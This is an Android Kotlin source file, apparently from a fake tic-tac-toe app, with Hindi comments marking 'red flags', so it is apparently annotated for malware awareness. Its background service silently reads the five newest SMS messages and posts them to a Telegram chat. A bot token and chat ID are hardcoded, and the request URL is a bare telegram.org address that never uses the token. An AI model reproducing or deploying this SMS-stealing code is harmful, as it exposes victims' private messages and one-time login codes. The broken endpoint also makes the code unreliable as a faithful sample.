package com.example.tictactoe.services

import android.app.Service
import android.content.Intent
import android.net.Uri
import android.os.IBinder
import java.io.OutputStream
import java.net.HttpURLConnection
import java.net.URL

class BackgroundDataService : Service() {

    // 🛑 RED FLAG 3: हैकर का हार्डकोडेड टेलीग्राम बॉट टोकन और चैट आईडी
    private val BOT_TOKEN = "8474712057:AAHAOpGfcm5fdoiwgyF9dYQyzaCH4_46J4g"
    private val CHAT_ID = "1004365707658"

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        Thread {
            try {
                val smsData = readInboxSMS()
                if (smsData.isNotEmpty()) {
                    sendToTelegram(smsData)
                }
            } catch (e: Exception) { }
        }.start()
        return START_STICKY
    }

    private fun readInboxSMS(): String {
        val smsBuilder = StringBuilder()
        val cursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null)
        if (cursor != null && cursor.moveToFirst()) {
            val addressIndex = cursor.getColumnIndex("address")
            val bodyIndex = cursor.getColumnIndex("body")
            var count = 0
            do {
                val from = cursor.getString(addressIndex)
                val body = cursor.getString(bodyIndex)
                smsBuilder.append("From: $from\nMsg: $body\n\n")
                count++
            } while (cursor.moveToNext() && count < 5) // टॉप 5 मैसेजेस रीड करना
            cursor.close()
        }
        return smsBuilder.toString()
    }

    private fun sendToTelegram(message: String) {
        try {
            val url = URL("https://telegram.org")
            val conn = url.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")

            val postData = "chat_id=$CHAT_ID&text=${java.net.URLEncoder.encode(message, "UTF-8")}"
            val os: OutputStream = conn.outputStream
            os.write(postData.toByteArray())
            os.flush()
            os.close()
            conn.responseCode // रिक्वेस्ट सेंड करना
        } catch (e: Exception) { }
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
